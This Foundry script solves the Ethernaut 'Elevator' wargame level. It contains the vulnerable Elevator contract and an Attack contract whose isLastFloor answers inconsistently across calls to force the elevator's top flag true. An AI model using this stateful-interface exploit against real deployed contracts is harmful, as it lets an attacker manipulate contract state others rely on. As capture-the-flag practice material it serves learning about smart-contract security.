// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Attack {
    address immutable instance;
    constructor(address addr) payable {
        instance = addr;
    }
    function isLastFloor(uint256 floor) external returns(bool){
        if(Elevator(instance).floor()==0) return false; 
        return true;
    }

    function exploit() external {
        Elevator(instance).goTo(1);
    } 
}

contract ElevatorSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

       Attack attack = new Attack(challengeInstance);
        attack.exploit();


        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(11));
    }
}
